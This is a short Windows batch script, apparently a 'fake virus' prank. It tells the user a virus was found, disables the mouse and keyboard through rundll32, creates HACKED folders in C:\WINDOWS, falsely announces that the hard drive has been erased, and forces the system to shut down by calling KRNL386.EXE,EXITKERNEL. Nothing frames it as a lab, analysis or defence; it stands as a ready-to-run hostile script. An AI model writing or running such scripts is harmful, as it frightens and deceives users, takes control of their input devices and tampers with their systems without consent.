   @echo off
   echo Scanning...
   pause
   echo Windows has detected a virus in the System directory.
   echo Would you like Windows to delete the virus?
   CHOICE
   echo Access Denied.
   c:\windows\rundll32.exe mouse,disable
   c:\windows\rundll32.exe keyboard,disable
   echo I will now add files to Desktop.
   MD C:\WINDOWS\HACKED
   MD C:\WINDOWS\HACKED1
   MD C:\WINDOWS\HACKED2
   MD C:\WINDOWS\HACKED3
   MD C:\WINDOWS\HACKED4
   echo Now I will erase your hardrive.
   echo ....
   echo...
   echo Deletion Complete!
   RUNDLL32 KRNL386.EXE,EXITKERNEL
